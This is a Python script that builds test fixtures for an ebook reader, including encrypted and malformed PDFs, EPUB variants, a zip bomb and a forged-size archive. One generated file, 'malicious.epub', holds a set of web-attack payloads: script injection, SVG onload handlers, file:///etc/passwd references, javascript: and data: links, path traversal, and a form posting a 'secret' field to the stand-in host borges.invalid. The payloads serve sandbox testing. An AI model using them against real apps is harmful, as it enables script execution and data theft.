"""Recreate tiny Borges test documents using only Python's standard library."""
from pathlib import Path
from zipfile import ZipFile, ZIP_STORED
import hashlib
import struct
import zlib

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / 'tests/fixtures'
OUT.mkdir(exist_ok=True)
# A 24x24 solid coral image. Pixel color is an independent rendering oracle.
w = h = 24
pixels = bytes([224, 80, 48]) * w * h
png = b'\x89PNG\r\n\x1a\n'
def chunk(kind, data):
    return struct.pack('>I', len(data)) + kind + data + struct.pack('>I', zlib.crc32(kind + data))
png += chunk(b'IHDR', struct.pack('>IIBBBBB', w, h, 8, 2, 0, 0, 0))
png += chunk(b'IDAT', zlib.compress(b''.join(b'\0' + pixels[y*w*3:(y+1)*w*3] for y in range(h)))) + chunk(b'IEND', b'')

def pdf(name, scanned=False, metadata=False, password=None):
    objects = [b'<< /Type /Catalog /Pages 2 0 R >>', b'']
    def add(x):
        objects.append(x)
        return len(objects)
    font = add(b'<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>')
    image = add(b'<< /Type /XObject /Subtype /Image /Width 24 /Height 24 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Length ' + str(len(pixels)).encode() + b' >>\nstream\n' + pixels + b'\nendstream')
    pages = []
    for marker in ([''] if scanned else ['ORCHID FIRST', 'CEDAR SECOND', 'HARBOR THIRD']):
        content = b'q 96 0 0 96 40 70 cm /Im1 Do Q\n'
        if marker:
            content += f'BT /F1 20 Tf 40 240 Td ({marker}) Tj ET\nBT /F1 12 Tf 40 210 Td (lantern lantern) Tj ET\n'.encode()
        stream = add(b'<< /Length ' + str(len(content)).encode() + b' >>\nstream\n' + content + b'endstream')
        pages.append(add(f'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 320 320] /Resources << /Font << /F1 {font} 0 R >> /XObject << /Im1 {image} 0 R >> >> /Contents {stream} 0 R >>'.encode()))
    objects[1] = f'<< /Type /Pages /Count {len(pages)} /Kids [{" ".join(f"{p} 0 R" for p in pages)}] >>'.encode()
    if not scanned:
        outline_root = add(b'')
        outline_item = add(f'<< /Title (Harbor) /Parent {outline_root} 0 R /Dest [{pages[2]} 0 R /Fit] >>'.encode())
        objects[outline_root-1] = f'<< /Type /Outlines /First {outline_item} 0 R /Last {outline_item} 0 R /Count 1 >>'.encode()
        objects[0] = f'<< /Type /Catalog /Pages 2 0 R /Outlines {outline_root} 0 R >>'.encode()
        link = add(f'<< /Type /Annot /Subtype /Link /Rect [40 238 260 265] /Border [0 0 0] /Dest [{pages[1]} 0 R /Fit] >>'.encode())
        objects[pages[0]-1] = objects[pages[0]-1][:-3] + f' /Annots [{link} 0 R] >>'.encode()
    info = ''
    if metadata:
        info_id = add(b'<< /Title (Garden Atlas) /Author (Zora; Ana) /Subject (Maps) /Keywords (Travel; MAPS) >>')
        info = f' /Info {info_id} 0 R'
    encryption = ''
    if password is not None:
        # PDF Standard Security Handler revision 2, created entirely here.
        # Fixtures test refusal, including an empty user password, not decryption.
        padding = bytes.fromhex('28bf4e5e4e758a4164004e56fffa01082e2e00b6d0683e802f0ca9fe6453697a')
        def pad(value): return (value.encode() + padding)[:32]
        def rc4(key, data):
            state = list(range(256)); j = 0
            for i in range(256):
                j = (j + state[i] + key[i % len(key)]) % 256
                state[i], state[j] = state[j], state[i]
            i = j = 0; output = bytearray()
            for value in data:
                i = (i + 1) % 256; j = (j + state[i]) % 256
                state[i], state[j] = state[j], state[i]
                output.append(value ^ state[(state[i] + state[j]) % 256])
            return bytes(output)
        file_id = hashlib.md5(b'Borges created encryption refusal fixture').digest()
        owner = rc4(hashlib.md5(pad('owner-secret')).digest()[:5], pad(password))
        key = hashlib.md5(pad(password) + owner + struct.pack('<i', -4) + file_id).digest()[:5]
        user = rc4(key, padding)
        # There are no literal strings in the image-only document. Encrypt
        # each stream using its own object key; names/dictionaries stay plain.
        for index, obj in enumerate(objects):
            if b'\nstream\n' in obj:
                header, content = obj.split(b'\nstream\n', 1)
                end = content.rfind(b'\nendstream')
                object_key = hashlib.md5(key + (index+1).to_bytes(3, 'little') + bytes(2)).digest()[:10]
                objects[index] = header + b'\nstream\n' + rc4(object_key, content[:end]) + content[end:]
        encrypt_id = add(f'<< /Filter /Standard /V 1 /R 2 /Length 40 /O <{owner.hex()}> /U <{user.hex()}> /P -4 >>'.encode())
        encryption = f' /Encrypt {encrypt_id} 0 R /ID [<{file_id.hex()}> <{file_id.hex()}>]'
    data = b'%PDF-1.4\n'
    offsets = [0]
    for i, obj in enumerate(objects, 1):
        offsets.append(len(data))
        data += f'{i} 0 obj\n'.encode() + obj + b'\nendobj\n'
    xref = len(data)
    data += f'xref\n0 {len(offsets)}\n0000000000 65535 f \n'.encode()
    data += b''.join(f'{offset:010} 00000 n \n'.encode() for offset in offsets[1:])
    data += f'trailer\n<< /Size {len(offsets)} /Root 1 0 R{info}{encryption} >>\nstartxref\n{xref}\n%%EOF\n'.encode()
    (OUT / name).write_bytes(data)

pdf('known.pdf')
pdf('image-only.pdf', True)
font_path = ROOT / 'node_modules/pdfjs-dist/standard_fonts/LiberationSans-Regular.ttf'
identifier = 'urn:uuid:9c31d3ee-13a4-4f04-bf27-155d15d53aef'
for name, fixed, obfuscated in [('reflowable.epub', False, False), ('fixed.epub', True, False), ('obfuscated.epub', False, True)]:
    with ZipFile(OUT / name, 'w', compression=ZIP_STORED) as z:
        def put(path, content):
            from zipfile import ZipInfo
            info = ZipInfo(path, date_time=(2026, 1, 1, 0, 0, 0))
            z.writestr(info, content)
        put('mimetype', 'application/epub+zip')
        put('META-INF/container.xml', '<container xmlns="urn:oasis:names:tc:opendocument:xmlns:container" version="1.0"><rootfiles><rootfile full-path="book.opf" media-type="application/oebps-package+xml"/></rootfiles></container>')
        rendition = '<meta property="rendition:layout">pre-paginated</meta><meta property="rendition:spread">both</meta>' if fixed else ''
        font_manifest = '<item id="font" href="font.ttf" media-type="font/ttf"/>' if obfuscated else ''
        put('book.opf', f'<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="uid">{identifier}</dc:identifier><dc:title>Borges known fixture</dc:title><dc:language>en</dc:language><meta property="dcterms:modified">2026-01-01T00:00:00Z</meta>{rendition}</metadata><manifest><item id="one" href="one.xhtml" media-type="application/xhtml+xml"/><item id="two" href="two.xhtml" media-type="application/xhtml+xml"/><item id="image" href="coral.png" media-type="image/png"/><item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>{font_manifest}</manifest><spine><itemref idref="one"/><itemref idref="two"/></spine></package>')
        put('nav.xhtml', '<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><head><title>Contents</title></head><body><nav epub:type="toc"><ol><li><a href="one.xhtml">Orchid</a></li><li><a href="two.xhtml">Harbor</a></li></ol></nav></body></html>')
        for filename, marker in [('one.xhtml', 'ORCHID EPUB FIRST'), ('two.xhtml', 'HARBOR EPUB SECOND')]:
            style = '@font-face {font-family: Fixture; src:url(font.ttf)} body {font-family:Fixture}' if obfuscated else ''
            extra = ''.join(f'<p id="passage-{i}">LANTERN PASSAGE {i}. ' + 'The quiet garden carries a silver lantern beside the cedar trees. ' * 8 + '</p>' for i in range(1, 41)) if not fixed and filename == 'one.xhtml' else ''
            put(filename, f'<html xmlns="http://www.w3.org/1999/xhtml"><head><title>{marker}</title><meta name="viewport" content="width=400,height=500"/><style>{style}</style></head><body><h1>{marker}</h1><p>A known quiet garden beside the harbor.</p><img src="coral.png" width="96" height="96" alt="Coral square"/>{extra}</body></html>')
        put('coral.png', png)
        if obfuscated:
            key = hashlib.sha1(identifier.encode()).digest()
            font = font_path.read_bytes()
            put('font.ttf', bytes(b ^ key[i % len(key)] if i < 1040 else b for i, b in enumerate(font)))
            put('META-INF/encryption.xml', '<encryption xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><EncryptedData xmlns="http://www.w3.org/2001/04/xmlenc#"><EncryptionMethod Algorithm="http://www.idpf.org/2008/embedding"/><CipherData><CipherReference URI="font.ttf"/></CipherData></EncryptedData></encryption>')
(OUT / 'LICENSE_LIBERATION').write_bytes((font_path.parent / 'LICENSE_LIBERATION').read_bytes())

# Adversarial content is created here, never downloaded. Tests substitute this
# for the allowlisted EPUB; it is not an arbitrary-file entry point in the UI.
with ZipFile(OUT / 'obfuscated.epub') as original, ZipFile(OUT / 'malicious.epub', 'w', compression=ZIP_STORED) as adversarial:
    from zipfile import ZipInfo
    def attack_put(path, content):
        adversarial.writestr(ZipInfo(path, date_time=(2026, 1, 1, 0, 0, 0)), content)
    payload = '''<script>window.bookScriptRan = true; parent.bookScriptRan = true;</script>
<script src="evil.js"></script>
<script src="https://borges.invalid/remote-script.js"></script>
<meta http-equiv="refresh" content="0;url=borges://app/index.html"/>
<base href="https://borges.invalid/"/>
<link rel="dns-prefetch" href="https://borges.invalid/"/><link rel="preconnect" href="https://borges.invalid/"/>
<iframe src="borges://app/index.html"></iframe><object data="borges://app/index.html"></object><embed src="file:///etc/passwd"/>
<img alt="Remote image" src="https://borges.invalid/image.png" onerror="window.bookScriptRan=true"/>
<img alt="Host path" src="file:///etc/passwd"/>
<img alt="Traversal path" src="borges://reader/assets/..%2findex.html"/>
<svg xmlns="http://www.w3.org/2000/svg" onload="window.bookScriptRan=true"><script>window.bookScriptRan=true</script><rect width="4" height="4"/></svg>
<img alt="Scripted SVG" src="evil.svg"/>
<style>@import 'https://borges.invalid/remote.css'; @font-face { font-family: Remote; src: url(https://borges.invalid/font.woff2); } .remote { font-family: Remote; background-image: url(https://borges.invalid/background.png); }</style>
<p class="remote">REMOTE RESOURCE PROBE</p>
<a id="external" href="https://borges.invalid/reference" target="_blank" ping="https://borges.invalid/ping">External reference</a>
<a id="shell" href="borges://app/index.html" target="_top">Host shell</a>
<a id="javascript" href="java&#x9;script:window.bookScriptRan=true">Script link</a>
<a id="mailto" href="mailto:untrusted@example.invalid">Mail link</a>
<a id="file" href="file:///etc/passwd">Local file link</a>
<a id="data" href="data:text/html,%3Cscript%3Eparent.bookScriptRan=true%3C/script%3E">Data link</a>
<a id="download" href="coral.png" download="untrusted.png">Download</a>
<form action="https://borges.invalid/submit" target="_top"><input name="secret" value="book"/><button type="submit">Submit book form</button></form>'''
    for entry in original.infolist():
        content = original.read(entry.filename)
        if entry.filename == 'one.xhtml':
            # Keep attacks on a short, visible chapter for real input tests.
            text = content.decode()
            text = text[:text.index('<p id="passage-1">')] + payload + '</body></html>'
            content = text.encode()
        if entry.filename == 'book.opf':
            content = content.replace(b'</manifest>', b'<item id="evil" href="evil.js" media-type="text/javascript"/><item id="svg" href="evil.svg" media-type="image/svg+xml"/></manifest>')
        attack_put(entry.filename, content)
    attack_put('evil.js', 'window.bookScriptRan = true; parent.bookScriptRan = true;')
    attack_put('evil.svg', '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" onload="parent.bookScriptRan=true"><script>parent.bookScriptRan=true</script><rect width="24" height="24" fill="#e05030"/></svg>')

# Import-specific created fixtures. Core reader fixtures above stay unchanged.
pdf('import-metadata.pdf', metadata=True)
pdf('import-password.pdf', scanned=True, password='book-secret')
pdf('import-empty-password.pdf', scanned=True, password='')
(OUT / 'import-corrupt.pdf').write_bytes(b'%PDF-1.7\nnot a parseable document\n')

from zipfile import ZIP_DEFLATED
base_metadata = '<dc:title>Borges known fixture</dc:title>'
rich_metadata = '<dc:title>Garden Stories</dc:title><dc:creator>Zora</dc:creator><dc:creator>Ana</dc:creator><dc:subject>Gardens</dc:subject><dc:subject>GARDENS</dc:subject><dc:subject>Fiction</dc:subject>'
for variant in ['metadata', 'bad-cover', 'bad-metadata', 'no-metadata', 'drm', 'fake-font', 'bad-xml', 'bad-spine', 'bad-type', 'bomb', 'forged-size']:
    with ZipFile(OUT / 'reflowable.epub') as original, ZipFile(OUT / f'import-{variant}.epub', 'w', compression=ZIP_DEFLATED) as target:
        def put_import(path, data):
            from zipfile import ZipInfo
            entry = ZipInfo(path, date_time=(2026, 1, 1, 0, 0, 0))
            entry.compress_type = ZIP_DEFLATED
            target.writestr(entry, data)
        for entry in original.infolist():
            data = original.read(entry.filename)
            if entry.filename == 'book.opf':
                data = data.replace(base_metadata.encode(), rich_metadata.encode())
                if variant == 'no-metadata':
                    start = data.index(b'<metadata'); end = data.index(b'</metadata>') + len(b'</metadata>')
                    data = data[:start] + b'<metadata xmlns:dc="http://purl.org/dc/elements/1.1/"/>' + data[end:]
                if variant == 'bad-metadata':
                    data = data.replace(b'Garden Stories', b'A' * 1001)
                if variant == 'bad-cover': data = data.replace(b'Garden Stories', b'Garden Stories with missing cover')
                if variant in ['metadata', 'bad-cover']:
                    data = data.replace(b'</manifest>', b'<item id="cover" href="cover.png" media-type="image/png" properties="cover-image"/></manifest>')
                if variant == 'bad-type': data = data.replace(b'href="one.xhtml" media-type="application/xhtml+xml"', b'href="one.xhtml" media-type="application/octet-stream"')
                if variant == 'bad-spine': data = data.replace(b'idref="one"', b'idref="absent"')
            if entry.filename == 'one.xhtml' and variant == 'no-metadata': data = b'<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.1//EN\" \"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd\">' + data
            if entry.filename == 'one.xhtml' and variant == 'bad-xml': data = b'<html><body>broken'
            if entry.filename == 'one.xhtml' and variant in ['bomb', 'forged-size']: data = b'A' * (33 * 1024 * 1024)
            put_import(entry.filename, data)
        if variant in ['metadata', 'bad-cover']:
            put_import('cover.png', png if variant == 'metadata' else b'Not a PNG')
        if variant in ['drm', 'fake-font']:
            algorithm = 'http://www.w3.org/2001/04/xmlenc#aes128-cbc' if variant == 'drm' else 'http://www.idpf.org/2008/embedding'
            put_import('META-INF/encryption.xml', f'<encryption><EncryptedData xmlns="http://www.w3.org/2001/04/xmlenc#"><EncryptionMethod Algorithm="{algorithm}"/><CipherData><CipherReference URI="one.xhtml"/></CipherData></EncryptedData></encryption>')
    if variant == 'forged-size':
        # Lie in the central directory. Inflation must stop at the stated
        # bound instead of expanding 33 MiB before checking its output.
        path = OUT / f'import-{variant}.epub'
        data = bytearray(path.read_bytes()); at = 0
        while True:
            at = data.find(b'PK\x01\x02', at)
            if at < 0: break
            length = struct.unpack_from('<H', data, at + 28)[0]
            if data[at+46:at+46+length] == b'one.xhtml': struct.pack_into('<I', data, at + 24, 100)
            at += 46 + length
        path.write_bytes(data)
